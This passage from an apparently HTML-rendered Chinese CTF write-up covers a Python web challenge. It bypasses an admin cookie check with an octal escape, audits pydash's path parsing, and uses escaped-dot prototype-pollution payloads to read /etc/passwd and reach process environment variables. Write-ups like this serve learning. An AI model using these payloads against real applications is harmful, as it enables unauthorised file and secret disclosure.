class=\"string\">&quot;&quot;</span>.join(res)</span><br></pre></td></tr></table></figure>\n<p>​\t\t感觉，这个就是我们最主要的利用的点。</p>\n<p>​\t\t首先是这几行：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"built_in\">str</span> <span class=\"keyword\">is</span> <span class=\"literal\">None</span> <span class=\"keyword\">or</span> <span class=\"built_in\">len</span>(<span class=\"built_in\">str</span>) &lt; <span class=\"number\">2</span>:</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">str</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"built_in\">str</span>[<span class=\"number\">0</span>] != <span class=\"string\">&#x27;&quot;&#x27;</span> <span class=\"keyword\">or</span> <span class=\"built_in\">str</span>[-<span class=\"number\">1</span>] != <span class=\"string\">&#x27;&quot;&#x27;</span>:</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">str</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">str</span> = <span class=\"built_in\">str</span>[<span class=\"number\">1</span>:-<span class=\"number\">1</span>]</span><br></pre></td></tr></table></figure>\n<p>​\t\t判断传入的字符串（这里推测是 user=XXXX 中的 XXXX），发现如果第一个字符不是两种引号，则直接返回，如果是引号，则掐头去尾，把引号去掉。之后的代码我不大会审，跑去问了下 AI，可能有点儿智障，不过给了我一个方向，测试了一下，能成：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">i = <span class=\"number\">0</span></span><br><span class=\"line\">n = <span class=\"built_in\">len</span>(<span class=\"built_in\">str</span>)</span><br><span class=\"line\">res = []</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"number\">0</span> &lt;= i &lt; n:</span><br><span class=\"line\">    o_match = OCTAL_PATTERN.search(<span class=\"built_in\">str</span>, i)</span><br><span class=\"line\">    q_match = QUOTE_PATTERN.search(<span class=\"built_in\">str</span>, i)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> o_match <span class=\"keyword\">and</span> <span class=\"keyword\">not</span> q_match:</span><br><span class=\"line\">        res.append(<span class=\"built_in\">str</span>[i:])</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"comment\"># else:</span></span><br><span class=\"line\">    j = k = -<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> o_match:</span><br><span class=\"line\">        j = o_match.start(<span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> q_match:</span><br><span class=\"line\">        k = q_match.start(<span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> q_match <span class=\"keyword\">and</span> (<span class=\"keyword\">not</span> o_match <span class=\"keyword\">or</span> k &lt; j):</span><br><span class=\"line\">        res.append(<span class=\"built_in\">str</span>[i:k])</span><br><span class=\"line\">        res.append(<span class=\"built_in\">str</span>[k + <span class=\"number\">1</span>])</span><br><span class=\"line\">        i = k + <span class=\"number\">2</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        res.append(<span class=\"built_in\">str</span>[i:j])</span><br><span class=\"line\">        res.append(<span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(<span class=\"built_in\">str</span>[j + <span class=\"number\">1</span> : j + <span class=\"number\">4</span>], <span class=\"number\">8</span>)))  <span class=\"comment\"># noqa: E203</span></span><br><span class=\"line\">        i = j + <span class=\"number\">4</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/b7ed96c33d6c4f9fa6d71c7b2a5a49d5.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t\t后面还给了个它给写的改进的代码，不过就不放这儿了。</p>\n<p>​\t\t根据这个答案猜想，可能是通过八进制进行的绕过，测试一下，访问下 login 路由，然后修改 cookie 的值为 <code>Cookie: user=&quot;adm\\073n&quot;</code> ，之后试试看能否登陆成功？</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/545cfa811fea45829bf35e9fb54f09c0.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t\t成功了 <strong>(≧▽≦)o</strong>。</p>\n<p>​\t\t这里它返回了个 Session 值，然后将它给的 Session 值写到请求头内，然后访问 admin 路由，发现并没有 给我们直接 forbidden 掉，说明成功了。之后就是正儿八经的原型链污染读文件了，第一波，先读一下，先来个第一个 payload：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\"><span class=\"attr\">&quot;key&quot;</span>  <span class=\"punctuation\">:</span> <span class=\"string\">&quot;__init__.__globals__.__file__&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\"><span class=\"attr\">&quot;value&quot;</span> <span class=\"punctuation\">:</span> <span class=\"string\">&quot;/etc/passwd&quot;</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t然而，恭喜了，每过，被 forbidden 了。回去看看，破案了，admin 路由函数中存在这么一个比较： <code>if key and value and type(key) is str and '_.' not in key:</code> ，这个就卡住我了。先来看下这几行：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">key = request.json[<span class=\"string\">&#x27;key&#x27;</span>]</span><br><span class=\"line\">value = request.json[<span class=\"string\">&#x27;value&#x27;</span>]</span><br><span class=\"line\"><span class=\"keyword\">if</span> key <span class=\"keyword\">and</span> value <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(key) <span class=\"keyword\">is</span> <span class=\"built_in\">str</span> <span class=\"keyword\">and</span> <span class=\"string\">&#x27;_.&#x27;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> key:</span><br><span class=\"line\">    pollute = Pollute()</span><br><span class=\"line\">    pydash.set_(pollute, key, value)</span><br></pre></td></tr></table></figure>\n<p>​\t\t似乎需要绕过的仅仅只有 key 中的  <code>'_.'</code>  字符串，那么，需要的就是对 key 进行操作的地方应该重点观察，所以，上面这个代码应该重点看一看，当然， 前面的所有都没有用，最有用的只有 <code>pydash.set_(pollute, key, value)</code> ，那么，没办法了，跟进 set_() 函数：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">set_</span>(<span class=\"params\">obj, path, value</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    Sets the value of an object described by `path`. If any part of the object path doesn&#x27;t exist,</span></span><br><span class=\"line\"><span class=\"string\">    it will be created.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Args:</span></span><br><span class=\"line\"><span class=\"string\">        obj (list|dict): Object to modify.</span></span><br><span class=\"line\"><span class=\"string\">        path (str | list): Target path to set value to.</span></span><br><span class=\"line\"><span class=\"string\">        value (mixed): Value to set.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Returns:</span></span><br><span class=\"line\"><span class=\"string\">        mixed: Modified `obj`.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Warning:</span></span><br><span class=\"line\"><span class=\"string\">        `obj` is modified in place.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Example:</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">        &gt;&gt;&gt; set_(&#123;&#125;, &#x27;a.b.c&#x27;, 1)</span></span><br><span class=\"line\"><span class=\"string\">        &#123;&#x27;a&#x27;: &#123;&#x27;b&#x27;: &#123;&#x27;c&#x27;: 1&#125;&#125;&#125;</span></span><br><span class=\"line\"><span class=\"string\">        &gt;&gt;&gt; set_(&#123;&#125;, &#x27;a.0.c&#x27;, 1)</span></span><br><span class=\"line\"><span class=\"string\">        &#123;&#x27;a&#x27;: &#123;&#x27;0&#x27;: &#123;&#x27;c&#x27;: 1&#125;&#125;&#125;</span></span><br><span class=\"line\"><span class=\"string\">        &gt;&gt;&gt; set_([1, 2], &#x27;[2][0]&#x27;, 1)</span></span><br><span class=\"line\"><span class=\"string\">        [1, 2, [1]]</span></span><br><span class=\"line\"><span class=\"string\">        &gt;&gt;&gt; set_(&#123;&#125;, &#x27;a.b[0].c&#x27;, 1)</span></span><br><span class=\"line\"><span class=\"string\">        &#123;&#x27;a&#x27;: &#123;&#x27;b&#x27;: [&#123;&#x27;c&#x27;: 1&#125;]&#125;&#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    .. versionadded:: 2.2.0</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    .. versionchanged:: 3.3.0</span></span><br><span class=\"line\"><span class=\"string\">        Added :func:`set_` as main definition and :func:`deep_set` as alias.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    .. versionchanged:: 4.0.0</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">        - Modify `obj` in place.</span></span><br><span class=\"line\"><span class=\"string\">        - Support creating default path values as ``list`` or ``dict`` based on whether key or index</span></span><br><span class=\"line\"><span class=\"string\">          substrings are used.</span></span><br><span class=\"line\"><span class=\"string\">        - Remove alias ``deep_set``.</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> set_with(obj, path, value)</span><br></pre></td></tr></table></figure>\n<p>​\t\t算是，好消息吧，直接就看到了 path，我们传入的 key 或许就是这个叫 path 的东西，毕竟那个链子看起来也很像是路径。好，没啥内容，跟进 <code>set_with(obj, path, value)</code> 。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">set_with</span>(<span class=\"params\">obj, path, value, customizer=<span class=\"literal\">None</span></span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    This method is like :func:`set_` except that it accepts customizer which is invoked to produce</span></span><br><span class=\"line\"><span class=\"string\">    the objects of path. If customizer returns undefined path creation is handled by the method</span></span><br><span class=\"line\"><span class=\"string\">    instead. The customizer is invoked with three arguments: ``(nested_value, key, nested_object)``.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Args:</span></span><br><span class=\"line\"><span class=\"string\">        obj (list|dict): Object to modify.</span></span><br><span class=\"line\"><span class=\"string\">        path (str | list): Target path to set value to.</span></span><br><span class=\"line\"><span class=\"string\">        value (mixed): Value to set.</span></span><br><span class=\"line\"><span class=\"string\">        customizer (callable, optional): The function to customize assigned values.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Returns:</span></span><br><span class=\"line\"><span class=\"string\">        mixed: Modified `obj`.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Warning:</span></span><br><span class=\"line\"><span class=\"string\">        `obj` is modified in place.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Example:</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">        &gt;&gt;&gt; set_with(&#123;&#125;, &#x27;[0][1]&#x27;, &#x27;a&#x27;, lambda: &#123;&#125;)</span></span><br><span class=\"line\"><span class=\"string\">        &#123;0: &#123;1: &#x27;a&#x27;&#125;&#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    .. versionadded:: 4.0.0</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    .. versionchanged:: 4.3.1</span></span><br><span class=\"line\"><span class=\"string\">        Fixed bug where a callable `value` was called when being set.</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> update_with(obj, path, pyd.constant(value), customizer=customizer)</span><br></pre></td></tr></table></figure>\n<p>​\t\t盯着 path，继续跟进：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">update_with</span>(<span class=\"params\">obj, path, updater, customizer=<span class=\"literal\">None</span></span>):  <span class=\"comment\"># noqa: C901</span></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    This method is like :func:`update` except that it accepts customizer which is invoked to produce</span></span><br><span class=\"line\"><span class=\"string\">    the objects of path. If customizer returns ``None``, path creation is handled by the method</span></span><br><span class=\"line\"><span class=\"string\">    instead. The customizer is invoked with three arguments: ``(nested_value, key, nested_object)``.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Args:</span></span><br><span class=\"line\"><span class=\"string\">        obj (list|dict): Object to modify.</span></span><br><span class=\"line\"><span class=\"string\">        path (str|list): A string or list of keys that describe the object path to modify.</span></span><br><span class=\"line\"><span class=\"string\">        updater (callable): Function that returns updated value.</span></span><br><span class=\"line\"><span class=\"string\">        customizer (callable, optional): The function to customize assigned values.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Returns:</span></span><br><span class=\"line\"><span class=\"string\">        mixed: Updated `obj`.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Warning:</span></span><br><span class=\"line\"><span class=\"string\">        `obj` is modified in place.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Example:</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">        &gt;&gt;&gt; update_with(&#123;&#125;, &#x27;[0][1]&#x27;, lambda: &#x27;a&#x27;, lambda: &#123;&#125;)</span></span><br><span class=\"line\"><span class=\"string\">        &#123;0: &#123;1: &#x27;a&#x27;&#125;&#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    .. versionadded:: 4.0.0</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> <span class=\"built_in\">callable</span>(updater):</span><br><span class=\"line\">        updater = pyd.constant(updater)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> customizer <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"literal\">None</span> <span class=\"keyword\">and</span> <span class=\"keyword\">not</span> <span class=\"built_in\">callable</span>(customizer):</span><br><span class=\"line\">        call_customizer = partial(callit, clone, customizer, argcount=<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> customizer:</span><br><span class=\"line\">        call_customizer = partial(callit, customizer, argcount=getargcount(customizer, maxargs=<span class=\"number\">3</span>))</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        call_customizer = <span class=\"literal\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\">    default_type = <span class=\"built_in\">dict</span> <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(obj, <span class=\"built_in\">dict</span>) <span class=\"keyword\">else</span> <span class=\"built_in\">list</span></span><br><span class=\"line\">    tokens = to_path_tokens(path)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> pyd.is_list(tokens):  <span class=\"comment\"># pragma: no cover</span></span><br><span class=\"line\">        tokens = [tokens]</span><br><span class=\"line\"></span><br><span class=\"line\">    last_key = pyd.last(tokens)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(last_key, PathToken):</span><br><span class=\"line\">        last_key = last_key.key</span><br><span class=\"line\"></span><br><span class=\"line\">    target = obj</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> idx, token <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(pyd.initial(tokens)):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(token, PathToken):</span><br><span class=\"line\">            key = token.key</span><br><span class=\"line\">            default_factory = pyd.get(tokens, [idx + <span class=\"number\">1</span>, <span class=\"string\">&quot;default_factory&quot;</span>], default=default_type)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            key = token</span><br><span class=\"line\">            default_factory = default_type</span><br><span class=\"line\"></span><br><span class=\"line\">        obj_val = base_get(target, key, default=<span class=\"literal\">None</span>)</span><br><span class=\"line\">        path_obj = <span class=\"literal\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> call_customizer:</span><br><span class=\"line\">            path_obj = call_customizer(obj_val, key, target)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> path_obj <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">            path_obj = default_factory()</span><br><span class=\"line\"></span><br><span class=\"line\">        base_set(target, key, path_obj, allow_override=<span class=\"literal\">False</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            target = base_get(target, key, default=<span class=\"literal\">None</span>)</span><br><span class=\"line\">        <span class=\"keyword\">except</span> TypeError <span class=\"keyword\">as</span> exc:  <span class=\"comment\"># pragma: no cover</span></span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                target = target[<span class=\"built_in\">int</span>(key)]</span><br><span class=\"line\">                _failed = <span class=\"literal\">False</span></span><br><span class=\"line\">            <span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">                _failed = <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> _failed:</span><br><span class=\"line\">                <span class=\"keyword\">raise</span> TypeError(<span class=\"string\">f&quot;Unable to update object at index <span class=\"subst\">&#123;key!r&#125;</span>. <span class=\"subst\">&#123;exc&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    value = base_get(target, last_key, default=<span class=\"literal\">None</span>)</span><br><span class=\"line\">    base_set(target, last_key, callit(updater, value))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> obj</span><br></pre></td></tr></table></figure>\n<p>​\t\t继续跟进 path，似乎整个函数里就只有一个： <code>tokens = to_path_tokens(path)</code> ，还是无脑根：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">to_path_tokens</span>(<span class=\"params\">value</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;Parse `value` into :class:`PathToken` objects.&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> pyd.is_string(value) <span class=\"keyword\">and</span> (<span class=\"string\">&quot;.&quot;</span> <span class=\"keyword\">in</span> value <span class=\"keyword\">or</span> <span class=\"string\">&quot;[&quot;</span> <span class=\"keyword\">in</span> value):</span><br><span class=\"line\">        <span class=\"comment\"># Since we can&#x27;t tell whether a bare number is supposed to be dict key or a list index, we</span></span><br><span class=\"line\">        <span class=\"comment\"># support a special syntax where any string-integer surrounded by brackets is treated as a</span></span><br><span class=\"line\">        <span class=\"comment\"># list index and converted to an integer.</span></span><br><span class=\"line\">        keys = [</span><br><span class=\"line\">            PathToken(<span class=\"built_in\">int</span>(key[<span class=\"number\">1</span>:-<span class=\"number\">1</span>]), default_factory=<span class=\"built_in\">list</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> RE_PATH_LIST_INDEX.<span class=\"keyword\">match</span>(key)</span><br><span class=\"line\">            <span class=\"keyword\">else</span> PathToken(unescape_path_key(key), default_factory=<span class=\"built_in\">dict</span>)</span><br><span class=\"line\">            <span class=\"keyword\">for</span> key <span class=\"keyword\">in</span> <span class=\"built_in\">filter</span>(<span class=\"literal\">None</span>, RE_PATH_KEY_DELIM.split(value))</span><br><span class=\"line\">        ]</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> pyd.is_string(value) <span class=\"keyword\">or</span> pyd.is_number(value):</span><br><span class=\"line\">        keys = [PathToken(value, default_factory=<span class=\"built_in\">dict</span>)]</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> value <span class=\"keyword\">is</span> UNSET:</span><br><span class=\"line\">        keys = []</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        keys = value</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> keys</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​\t\t这儿不知道怎么操作了，但是跟进  <code>RE_PATH_KEY_DELIM</code>  后得到了个正则表达式：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">RE_PATH_KEY_DELIM = re.<span class=\"built_in\">compile</span>(<span class=\"string\">r&quot;(?&lt;!\\\\)(?:\\\\\\\\)*\\.|(\\[\\d+\\])&quot;</span>)</span><br></pre></td></tr></table></figure>\n<p>​\t\t问了下 ai，ai 的回复中有一点儿值得注意：</p>\n<blockquote>\n<p>请注意，这个正则表达式在处理复杂的转义序列时可能不是完美的，特别是当字符串中包含连续的转义字符（如  <code>\\\\\\\\.</code> ），这些字符可能意图表示一个实际的点号但前面有偶数个反斜杠。此外，如果点号后面紧跟的是字母或其他非数字字符，它仍然会被匹配为分隔符，即使这可能不是预期的。</p>\n</blockquote>\n<p>​\t\t我个人已经别无他法了，照着它给的这个这 <code>\\\\\\\\.</code>  试着绕了一下，结果成功了，payload 如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\"><span class=\"attr\">&quot;key&quot;</span>  <span class=\"punctuation\">:</span> <span class=\"string\">&quot;__init__\\\\\\\\.__globals__\\\\\\\\.__file__&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\"><span class=\"attr\">&quot;value&quot;</span> <span class=\"punctuation\">:</span> <span class=\"string\">&quot;/etc/passwd&quot;</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t访问 src 路由，成功读取到了文件：</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/550d038c156f4d6b8438ed492ff66ab8.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t\t好了，照理来说，这个题目如果这样的话已经成功了，利用如下 payload 直接读取进程的环境变量即可：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\"><span class=\"attr\">&quot;key&quot;</span>  <span class=\"punctuation\">:</span> <span 